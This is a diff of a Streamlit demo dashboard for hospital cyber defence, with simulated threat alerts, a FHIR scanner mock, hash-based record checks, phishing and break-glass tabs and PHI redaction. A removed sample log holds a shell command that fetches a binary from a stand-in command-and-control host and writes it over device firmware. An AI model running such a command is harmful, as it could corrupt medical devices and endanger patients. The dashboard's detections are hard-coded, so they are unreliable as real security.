@@ -77,285 +77,174 @@ st.markdown("""
         box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
         margin-bottom: 14px;
     }
-    .card-label-row {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-bottom: 8px;
-    }
-    .card-label {
+    .badge-secure {
         font-family: 'JetBrains Mono', monospace;
         font-size: 0.65rem;
+        padding: 3px 8px;
+        border-radius: 4px;
         font-weight: 600;
-        color: rgba(255, 255, 255, 0.45);
-        letter-spacing: 0.1em;
         text-transform: uppercase;
+        background: rgba(34, 197, 94, 0.1);
+        color: #4ade80;
+        border: 1px solid rgba(34, 197, 94, 0.3);
     }
-    .card-val-row {
-        display: flex;
-        justify-content: space-between;
-        align-items: baseline;
-        margin-bottom: 12px;
-    }
-    .card-val {
-        font-family: 'Cinzel', Georgia, serif;
-        font-size: 1.85rem;
+    .threat-badge-critical {
+        background: rgba(239, 68, 68, 0.15);
+        color: #f87171;
+        border: 1px solid rgba(239, 68, 68, 0.3);
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 0.7rem;
+        padding: 2px 8px;
+        border-radius: 4px;
         font-weight: 700;
-        color: #ffffff;
-        letter-spacing: -0.02em;
     }
-    .sub-red { color: #f87171; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; }
-    .sub-green { color: #34d399; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; }
-    .sub-blue { color: #60a5fa; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; }
-
-    .progress-bar-bg {
-        width: 100%;
-        height: 5px;
-        background: rgba(255, 255, 255, 0.06);
-        border-radius: 9999px;
-        overflow: hidden;
-    }
-    .progress-red { background: #ef4444; height: 100%; width: 55%; box-shadow: 0 0 10px rgba(239, 68, 68, 0.7); }
-    .progress-blue { background: #3b82f6; height: 100%; width: 99%; box-shadow: 0 0 10px rgba(59, 130, 246, 0.7); }
-    .progress-cyan { background: #2563eb; height: 100%; width: 100%; box-shadow: 0 0 10px rgba(37, 99, 235, 0.7); }
-    .progress-green { background: #10b981; height: 100%; width: 98%; box-shadow: 0 0 10px rgba(16, 185, 129, 0.7); }
-
     .threat-card {
-        background-color: #0d0d12;
+        background-color: #111118;
         border: 1px solid rgba(255, 255, 255, 0.08);
         border-radius: 10px;
         padding: 16px;
         margin-bottom: 12px;
     }
-    .threat-badge-critical {
-        background: rgba(239, 68, 68, 0.15);
-        color: #f87171;
-        border: 1px solid rgba(239, 68, 68, 0.35);
-        padding: 2px 8px;
-        border-radius: 4px;
-        font-family: 'JetBrains Mono', monospace;
-        font-size: 0.7rem;
-        font-weight: 600;
-    }
-    .threat-badge-high {
-        background: rgba(245, 158, 11, 0.15);
-        color: #fbbf24;
-        border: 1px solid rgba(245, 158, 11, 0.35);
-        padding: 2px 8px;
-        border-radius: 4px;
-        font-family: 'JetBrains Mono', monospace;
-        font-size: 0.7rem;
-        font-weight: 600;
-    }
-    .stTabs [data-baseweb="tab"] {
-        border-radius: 8px;
-        padding: 8px 14px;
-        background-color: rgba(255, 255, 255, 0.03);
-        border: 1px solid rgba(255, 255, 255, 0.06);
-        color: rgba(255, 255, 255, 0.55);
-        font-size: 0.8rem;
-    }
-    .stTabs [aria-selected="true"] {
-        background-color: rgba(37, 99, 235, 0.2) !important;
-        border-color: rgba(59, 130, 246, 0.4) !important;
-        color: #93c5fd !important;
-    }
 </style>
 """, unsafe_allow_html=True)
 
-# Session State
+# Session State Initialization
 if "threats" not in st.session_state:
     st.session_state.threats = [
         {
-            "id": "THREAT-9041",
+            "id": "THREAT-9402",
             "timestamp": "2 mins ago",
-            "sourceIp": "185.220.101.42 (Tor Exit Node)",
-            "targetAsset": "ICU Ward 4 - Smart Infusion Pump (IP: 10.24.110.15)",
-            "attackVector": "Unauthorized Telnet Brute Force & IoMT Firmware Tamper Attempt",
+            "sourceIp": "185.220.101.5 (Tor Exit Node)",
+            "targetAsset": "ICU Ventilator Grid (IP: 10.24.110.38)",
+            "attackVector": "IoMT Remote Code Injection & Firmware Corruption",
             "severity": "CRITICAL",
-            "mitreTechnique": "T1210 (Exploitation of Remote Services) / T1542 (Firmware Corruption)",
+            "mitreTechnique": "T1542 (Hardware Firmware Corruption)",
             "status": "ACTIVE",
-            "rawLog": "2026-08-27T08:41:12.104Z [IoMT-FW-ALARM] Source: 185.220.101.42:49811 -> Dest: 10.24.110.15:23\nPAYLOAD: EXEC /bin/sh -c 'curl http://c2.medbotnet.su/pump_patch.bin > /dev/mtd0'\nSTATUS: DROPPED BY ZERO-TRUST FIREWALL GATEWAY."
+            "description": "Anomalous telnet burst attempting to overwrite PEEP and tidal volume settings without nurse biometric override."
         },
         {
-            "id": "THREAT-9038",
+            "id": "THREAT-8821",
             "timestamp": "14 mins ago",
-            "sourceIp": "192.168.4.18 (Guest Wi-Fi)",
-            "targetAsset": "FHIR API Gateway (/api/v1/Patient/88219/clinical-notes)",
-            "attackVector": "Broken Object Level Authorization (BOLA / IDOR) Enumeration",
+            "sourceIp": "192.168.10.45 (Radiology Floor Wi-Fi)",
+            "targetAsset": "Pharmacy Dispense API (/api/hl7/v2/MedicationRequest)",
+            "attackVector": "BOLA / IDOR Unauthorized Opioid Dispense Authorization",
             "severity": "HIGH",
-            "mitreTechnique": "T1595 (Active Scanning) / T1087 (Account Discovery)",
-            "status": "INVESTIGATING",
-            "rawLog": "2026-08-27T08:29:44.821Z [API-GATEWAY-WARN] User: rec_clerk_09 | Role: RECEPTION\nREQUEST: GET /fhir/r4/Patient/MRN-88219/DiagnosticReport\nRESPONSE: 403 FORBIDDEN - BOLA VIOLATION LOGGED."
+            "mitreTechnique": "T1078 (Valid Accounts / BOLA)",
+            "status": "ACTIVE",
+            "description": "Forged JSON payload attempting to bypass pharmacist approval to authorize 500 ampoules of Fentanyl."
         }
     ]
 
-if "private_key" not in st.session_state:
-    st.session_state.private_key = ec.generate_private_key(ec.SECP256R1())
-    st.session_state.public_key = st.session_state.private_key.public_key()
-
-# Top Header Bar
+# Navigation Header
 st.markdown("""
 <div class="vault-navbar">
-    <div style="display:flex; align-items:center; gap:14px;">
-        <div style="width:42px; height:42px; background:#2563eb; border-radius:10px; display:flex; align-items:center; justify-content:center; box-shadow:0 0 20px rgba(37,99,235,0.45); border:1px solid rgba(147,197,253,0.3);">
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-            </svg>
+    <div>
+        <div class="vault-title">
+            <span>🛡️ SENTINEL PRIVACY VAULT</span>
+            <span class="badge-id">ID-304</span>
         </div>
-        <div>
-            <div style="display:flex; align-items:center; gap:8px;">
-                <h1 class="vault-title">SENTINEL PRIVACY VAULT</h1>
-                <span class="badge-id">ID-304</span>
-            </div>
-            <div class="vault-subtitle">HEALTHCARE SECURE INFRASTRUCTURE • ST. JUDE METROPOLITAN</div>
-        </div>
+        <div class="vault-subtitle">HOSPITAL CYBER DEFENSE & PRIVACY GOVERNANCE SUITE</div>
     </div>
     <div style="display:flex; align-items:center; gap:12px;">
-        <div style="padding:6px 12px; border-radius:8px; background:rgba(59,130,246,0.08); border:1px solid rgba(59,130,246,0.25); font-family:'JetBrains Mono', monospace; font-size:0.7rem; color:#93c5fd;">
-            AES-256 / HSM: <strong style="color:#ffffff;">ACTIVE</strong>
-        </div>
-        <div style="padding:6px 12px; border-radius:8px; background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.25); font-family:'JetBrains Mono', monospace; font-size:0.7rem; color:#6ee7b7;">
-            SYSTEM: <strong style="color:#34d399;">OPERATIONAL</strong>
-        </div>
-        <div style="padding:6px 12px; border-radius:8px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); font-family:'JetBrains Mono', monospace; font-size:0.7rem; color:#cbd5e1;">
-            ZERO-TRUST: <strong style="color:#ffffff;">ENFORCED</strong>
+        <div style="padding:6px 12px; border-radius:8px; background:rgba(34,197,94,0.1); border:1px solid rgba(34,197,94,0.25); font-family:'JetBrains Mono', monospace; font-size:0.7rem; color:#4ade80;">
+            ● COMPLIANCE: <strong>DPDP ACT 2023 & HIPAA</strong>
         </div>
     </div>
 </div>
 """, unsafe_allow_html=True)
 
 # Tabs
-active_count = len([t for t in st.session_state.threats if t["status"] in ["ACTIVE", "INVESTIGATING"]])
+active_count = len([t for t in st.session_state.threats if t["status"] == "ACTIVE"])
 tabs = st.tabs([
+    "🌟 Guest & Executive Overview",
     f"⚡ SOC Threat Monitor ({active_count} Active)",
-    "📡 API Vulnerability Scanner",
-    "✍️ Cryptographic Records & Signatures",
-    "✉️ Phishing & Social Shield",
-    "🔒 Zero-Trust IAM & Break-Glass",
+    "📡 FHIR API Scanner",
+    "✍️ Record Integrity & Signatures",
+    "✉️ AI Phishing Shield",
+    "🔒 Zero-Trust & Break-Glass",
     "💉 IoMT & Hardware HSM",
     "⚖️ DPDP & HIPAA Governance"
 ])
 
-# TAB 1: SOC THREAT MONITOR
+# ================= TAB 0: GUEST & EXECUTIVE OVERVIEW =================
 with tabs[0]:
-    col_c1, col_c2 = st.columns(2)
-    with col_c1:
-        st.markdown(f"""
-        <div class="sentinel-card">
-            <div class="card-label-row">
-                <span class="card-label">ACTIVE ALARMS</span>
-                <span style="color:#f87171; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.3); padding:4px 8px; border-radius:6px; font-size:0.75rem;">⚠️</span>
-            </div>
-            <div class="card-val-row">
-                <span class="card-val">{active_count}</span>
-                <span class="sub-red">Critical Triage</span>
-            </div>
-            <div class="progress-bar-bg"><div class="progress-red"></div></div>
-        </div>
-        """, unsafe_allow_html=True)
-
-        st.markdown("""
-        <div class="sentinel-card">
-            <div class="card-label-row">
-                <span class="card-label">TOKEN VERIFICATIONS</span>
-                <span style="color:#60a5fa; background:rgba(59,130,246,0.1); border:1px solid rgba(59,130,246,0.3); padding:4px 8px; border-radius:6px; font-size:0.75rem;">🛡️</span>
-            </div>
-            <div class="card-val-row">
-                <span class="card-val">24,819</span>
-                <span class="sub-blue">0 Unauthorized</span>
-            </div>
-            <div class="progress-bar-bg"><div class="progress-cyan"></div></div>
-        </div>
-        """, unsafe_allow_html=True)
-
-    with col_c2:
-        st.markdown("""
-        <div class="sentinel-card">
-            <div class="card-label-row">
-                <span class="card-label">IOMT MEDICAL FLEET</span>
-                <span style="color:#60a5fa; background:rgba(59,130,246,0.1); border:1px solid rgba(59,130,246,0.3); padding:4px 8px; border-radius:6px; font-size:0.75rem;">⚙️</span>
-            </div>
-            <div class="card-val-row">
-                <span class="card-val">428 / 430</span>
-                <span class="sub-green">99.5% Online</span>
-            </div>
-            <div class="progress-bar-bg"><div class="progress-blue"></div></div>
-        </div>
-        """, unsafe_allow_html=True)
-
-        st.markdown("""
-        <div class="sentinel-card">
-            <div class="card-label-row">
-                <span class="card-label">PRIVACY COMPLIANCE</span>
-                <span style="color:#34d399; background:rgba(16,185,129,0.1); border:1px solid rgba(16,185,129,0.3); padding:4px 8px; border-radius:6px; font-size:0.75rem;">📈</span>
-            </div>
-            <div class="card-val-row">
-                <span class="card-val">DPDP / HIPAA</span>
-                <span class="sub-green">Audited & Sealed</span>
-            </div>
-            <div class="progress-bar-bg"><div class="progress-green"></div></div>
-        </div>
-        """, unsafe_allow_html=True)
-
-    col_h1, col_h2 = st.columns([4, 1])
-    with col_h1:
-        st.markdown("""
-        <div style="display:flex; align-items:center; gap:8px; margin-top:8px;">
-            <span style="color:#60a5fa; font-size:1.2rem;">📈</span>
-            <h3 style="font-family:'Cinzel', Georgia, serif; font-size:1.2rem; font-weight:700; color:#ffffff; margin:0;">
-                Live Healthcare SIEM Telemetry & Alarms
-            </h3>
-        </div>
-        <p style="font-size:0.8rem; color:rgba(255,255,255,0.45); margin:2px 0 12px 0;">
-            Continuous sensor monitoring across EHR, IoMT networks, and clinical API gateways
+    st.markdown("""
+    <div style="background: linear-gradient(135deg, #0e172e 0%, #111420 100%); border: 1px solid rgba(59, 130, 246, 0.4); border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem;">
+        <span class="badge-secure" style="font-size:0.8rem; background:rgba(59,130,246,0.2); color:#93c5fd; border:1px solid rgba(59,130,246,0.4);">PROJECT ID-304 • GUEST TOUR</span>
+        <h2 style="font-family:'Cinzel', serif; color:#ffffff; margin-top:8px;">Hospital CyberGuard & Data Privacy Governance Suite</h2>
+        <p style="color:#cbd5e1; font-size:0.95rem; line-height:1.6;">
+            A complete clinical cybersecurity platform designed to protect patient lives, medical IoT devices (ventilators & pumps), and electronic health records from ransomware, BOLA API leaks, and illegal prescription tampering.
         </p>
+    </div>
+    """, unsafe_allow_html=True)
+
+    col_g1, col_g2, col_g3 = st.columns(3)
+    with col_g1:
+        st.markdown("""
+        <div class="sentinel-card">
+            <h4 style="color:#4ade80;">1. 100% Tamper-Proof Records</h4>
+            <p style="font-size:0.85rem; color:#94a3b8;">Uses ECDSA P-256 digital signatures & SHA-256 hash checks to stop medication dose alterations before pharmacy dispensing.</p>
+        </div>
+        """, unsafe_allow_html=True)
+    with col_g2:
+        st.markdown("""
+        <div class="sentinel-card">
+            <h4 style="color:#38bdf8;">2. Medical Device (IoMT) Shield</h4>
+            <p style="font-size:0.85rem; color:#94a3b8;">Hardware Security Module (HSM) root-of-trust isolates compromised ventilators into sandboxed VLANs in <45ms.</p>
+        </div>
+        """, unsafe_allow_html=True)
+    with col_g3:
+        st.markdown("""
+        <div class="sentinel-card">
+            <h4 style="color:#a78bfa;">3. Zero-Trust & Break-Glass</h4>
+            <p style="font-size:0.85rem; color:#94a3b8;">Strict least-privilege ABAC combined with sub-50ms life-saving emergency bypass for Code-Blue cardiac trauma resuscitations.</p>
+        </div>
         """, unsafe_allow_html=True)
 
-    with col_h2:
-        if st.button("⚡ Simulate Attack", type="primary", use_container_width=True):
-            sim_id = f"THREAT-{int(time.time()) % 900 + 9100}"
-            new_attack = {
-                "id": sim_id,
+# ================= TAB 1: SOC THREAT MONITOR =================
+with tabs[1]:
+    st.subheader("⚡ Real-Time SIEM Threat Radar & Incident Mitigation")
+    col_t1, col_t2 = st.columns([3, 1])
+    with col_t2:
+        if st.button("🚨 Simulate Inbound Cyberattack", type="primary"):
+            new_id = f"THREAT-{int(time.time()) % 10000}"
+            st.session_state.threats.insert(0, {
+                "id": new_id,
                 "timestamp": "Just now",
-                "sourceIp": "91.240.118.82 (MedLocker 4.0 C2)",
+                "sourceIp": "91.240.118.82 (MedLocker 4.0 Botnet)",
                 "targetAsset": "Oncology PACS Archive (Port 104)",
-                "attackVector": "Ransomware Infiltration Attempt via Compromised VPN Credential",
+                "attackVector": "Ransomware Infiltration Attempt via Compromised VPN",
                 "severity": "CRITICAL",
                 "mitreTechnique": "T1486 (Data Encrypted for Impact)",
                 "status": "ACTIVE",
-                "rawLog": f"{datetime.now().isoformat()} [CRITICAL-SOC-ALARM] Source: 91.240.118.82 -> Dest: PACS_GRID_104\nATTACK: MedLocker 4.0 Extortion Payload\nSTATUS: Intercepted by Hospital Zero-Trust AI Gateway."
-            }
-            st.session_state.threats.insert(0, new_attack)
+                "description": "High-volume encrypted payload delivery attempted against PACS imaging servers."
+            })
             st.rerun()
 
     for threat in st.session_state.threats:
-        badge_cls = "threat-badge-critical" if threat["severity"] == "CRITICAL" else "threat-badge-high"
+        badge_cls = "threat-badge-critical" if threat["severity"] == "CRITICAL" else "badge-secure"
         st.markdown(f"""
         <div class="threat-card">
-            <div style="display:flex; justify-content:space-between; align-items:flex-start;">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
                 <div>
-                    <div style="display:flex; align-items:center; gap:8px;">
-                        <span style="font-family:'JetBrains Mono', monospace; font-size:0.95rem; font-weight:700; color:#60a5fa;">{threat['id']}</span>
-                        <span class="{badge_cls}">{threat['severity']}</span>
-                        <span style="color:#f87171; font-family:'JetBrains Mono', monospace; font-size:0.75rem; font-weight:600;">• {threat['status']}</span>
-                        <span style="font-size:0.75rem; color:rgba(255,255,255,0.35); font-family:'JetBrains Mono', monospace;">({threat['timestamp']})</span>
-                    </div>
-                    <div style="font-size:0.92rem; font-weight:600; color:#ffffff; margin-top:6px;">{threat['attackVector']}</div>
-                    <div style="font-size:0.8rem; color:rgba(255,255,255,0.55); margin-top:2px;">Target: <code style="color:#93c5fd; background:rgba(255,255,255,0.05); padding:1px 4px; border-radius:3px;">{threat['targetAsset']}</code></div>
-                    <div style="font-size:0.8rem; color:rgba(255,255,255,0.4); margin-top:2px;">Source IP: <code style="color:#f87171;">{threat['sourceIp']}</code> | MITRE: <span style="color:#fbbf24;">{threat['mitreTechnique']}</span></div>
+                    <span style="font-family:'JetBrains Mono', monospace; font-weight:700; color:#60a5fa;">{threat['id']}</span>
+                    <span class="{badge_cls}" style="margin-left:8px;">{threat['severity']}</span>
+                    <span style="color:#f87171; font-size:0.75rem; margin-left:8px;">• {threat['status']}</span>
                 </div>
+                <span style="font-size:0.75rem; color:rgba(255,255,255,0.4);">{threat['timestamp']}</span>
             </div>
+            <div style="font-weight:600; color:#ffffff; margin-top:6px;">{threat['attackVector']}</div>
+            <div style="font-size:0.8rem; color:#94a3b8; margin-top:2px;">Target: <code>{threat['targetAsset']}</code> | IP: <code style="color:#f87171;">{threat['sourceIp']}</code></div>
         </div>
         """, unsafe_allow_html=True)
         if threat["status"] != "CONTAINED":
             if st.button(f"🛡️ Contain Threat {threat['id']}", key=f"contain_{threat['id']}"):
                 threat["status"] = "CONTAINED"
-                st.success(f"{threat['id']} contained & isolated!")
+                st.success(f"{threat['id']} contained on hospital firewall!")
                 st.rerun()
 
-# TAB 2: API SCANNER
-with tabs[1]:
+# ================= TAB 2: API SCANNER =================
+with tabs[2]:
     st.subheader("🔍 FHIR REST API Vulnerability & Pentesting Studio")
     endpoint = st.selectbox("FHIR Resource Endpoint", ["/api/fhir/Patient/PT-44029", "/api/fhir/Observation?patient=PT-44029", "/api/fhir/MedicationRequest"])
     test_vector = st.radio("OWASP Threat Vector", ["API1:2023 Broken Object Level Authorization (BOLA)", "API3:2023 Mass Assignment", "API4:2023 Rate Limit"])
@@ -363,12 +252,12 @@ with tabs[1]:
         st.error("🚨 VULNERABILITY DETECTED: Broken Object Level Authorization (BOLA)")
         st.code(json.dumps({"rule_id": "WAF-FHIR-BOLA-DEFENSE-304", "action": "DENY_UNLESS_ABAC_VERIFIED"}, indent=2), language="json")
 
-# TAB 3: CRYPTO RECORDS
-with tabs[2]:
+# ================= TAB 3: CRYPTO RECORDS =================
+with tabs[3]:
     st.subheader("✍️ Cryptographic Medical Record Integrity & Tamper Detector")
     pid = st.text_input("Patient ID", value="PT-90412")
     pname = st.text_input("Patient Name", value="Alexander Wright")
-    diag = st.text_input("Clinical Diagnosis", value="Acute Myocardial Infarction (ICD-10 I21.9)")
+    diag = st.text_input("Clinical Diagnosis & Prescription", value="Morphine Sulfate 10mg IV STAT (ICD-10 I21.9)")
     raw_payload = f"{pid}|{pname}|{diag}"
     computed_hash = hashlib.sha256(raw_payload.encode('utf-8')).hexdigest()
     st.code(f"SHA-256 Digest: {computed_hash}")
@@ -376,37 +265,50 @@ with tabs[2]:
         st.session_state.locked_hash = computed_hash
         st.success("Record locked with cryptographic digital signature!")
     if st.session_state.get("locked_hash") == computed_hash:
-        st.success("✅ RECORD INTEGRITY VERIFIED")
-    else:
-        st.error("🚨 TAMPERING DETECTED")
+        st.success("✅ RECORD INTEGRITY VERIFIED (Valid ECDSA Signature)")
+    elif "locked_hash" in st.session_state:
+        st.error("🚨 TAMPERING DETECTED! HASH MISMATCH (Signature Broken)")
 
-# TAB 4: PHISHING
-with tabs[3]:
+# ================= TAB 4: PHISHING =================
+with tabs[4]:
     st.subheader("🧠 AI-Powered Healthcare Phishing & Social Engineering Dissector")
     email_text = st.text_area("Inbound Message", value="URGENT: Re-authenticate clinical SmartCard within 2 hours at http://hospital-secure-login.net/auth")
     if st.button("🔬 Dissect with AI Security Engine", type="primary"):
         st.error("🚨 HIGH CONFIDENCE PHISHING ATTEMPT (99.4% Probability) - MITRE T1566")
 
-# TAB 5: ZERO TRUST
-with tabs[4]:
-    st.subheader("🚨 Zero-Trust IAM & Code-Blue Break-Glass Access")
-    reason = st.text_input("Emergency Resuscitation Justification", placeholder="Code Blue Ward 4B")
-    if st.button("🚨 TRIGGER EMERGENCY BREAK-GLASS ACCESS", type="primary"):
-        st.warning(f"EMERGENCY OVERRIDE ACTIVATED: {reason}")
-
-# TAB 6: IOMT HSM
+# ================= TAB 5: ZERO TRUST =================
 with tabs[5]:
+    st.subheader("🚨 Zero-Trust IAM & Code-Blue Break-Glass Access")
+    reason = st.text_input("Emergency Resuscitation Justification", placeholder="Code Blue Ward 4B - Traumatic Cardiac Arrest")
+    if st.button("🚨 TRIGGER EMERGENCY BREAK-GLASS ACCESS", type="primary"):
+        st.warning(f"EMERGENCY OVERRIDE ACTIVATED: {reason} (Audit log generated under HIPAA §164.312)")
+
+# ================= TAB 6: IOMT HSM =================
+with tabs[6]:
     st.subheader("💉 IoMT Hardware Fleet & HSM Cryptographic Enclave")
     st.dataframe(pd.DataFrame([
-        {"Device": "Alaris Infusion Pump #12", "Firmware": "v3.2.1-SEC", "Status": "ONLINE"},
-        {"Device": "Hamilton Ventilator #04", "Firmware": "v5.0.0-PROD", "Status": "ONLINE"},
-        {"Device": "Fresenius Dialysis #09", "Firmware": "v2.1.0-LEGACY", "Status": "COMPROMISED"}
+        {"Device": "Alaris Infusion Pump #12", "Firmware": "v3.2.1-SEC", "Status": "ONLINE", "Safeguard": "HSM Verified"},
+        {"Device": "Hamilton Ventilator #04", "Firmware": "v5.0.0-PROD", "Status": "ONLINE", "Safeguard": "802.1X Active"},
+        {"Device": "Fresenius Dialysis #09", "Firmware": "v2.1.0-LEGACY", "Status": "QUARANTINED", "Safeguard": "VLAN Sandbox"}
     ]), use_container_width=True)
 
-# TAB 7: DPDP & HIPAA
-with tabs[6]:
-    st.subheader("⚖️ DPDP Act 2023 & HIPAA Safe Harbor Governance")
-    sample_text = st.text_area("Input EHR Record with PHI", value="Patient Alexander Wright (MRN: MRN-90214) admitted on 2026-08-20.")
-    deidentified = re.sub(r'Patient\s+[A-Z][a-z]+\s+[A-Z][a-z]+', 'Patient [REDACTED_NAME]', sample_text)
-    deidentified = re.sub(r'MRN-\d+', '[REDACTED_MRN]', deidentified)
+# ================= TAB 7: DPDP & HIPAA =================
+with tabs[7]:
+    st.subheader("⚖️ DPDP Act 2023 & HIPAA 18-PHI Safe Harbor Studio")
+    sample_ehr = st.text_area(
+        "Input Raw Medical Record (Contains Protected Health Information)",
+        value="Patient Johnathan Doe (MRN: MRN-90214, SSN: 000-12-3456, DOB: 1980-04-12) was admitted on 2026-08-20. Contact: (555) 234-5678, email: jdoe@email.com. Prescribed Lisinopril 20mg daily.",
+        height=100
+    )
+    def deidentify(text):
+        text = re.sub(r'Patient\s+[A-Z][a-z]+\s+[A-Z][a-z]+', 'Patient [REDACTED_NAME]', text)
+        text = re.sub(r'MRN-\d+', '[REDACTED_MRN]', text)
+        text = re.sub(r'\d{3}-\d{2}-\d{4}', '[REDACTED_SSN]', text)
+        text = re.sub(r'\d{4}-\d{2}-\d{2}', '[REDACTED_DATE]', text)
+        text = re.sub(r'\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}', '[REDACTED_PHONE]', text)
+        text = re.sub(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', '[REDACTED_EMAIL]', text)
+        return text
+
+    deidentified = deidentify(sample_ehr)
+    st.markdown("**Safe Harbor De-Identified Output (DPDP Act 2023 / HIPAA Compliant):**")
     st.code(deidentified, language="text")
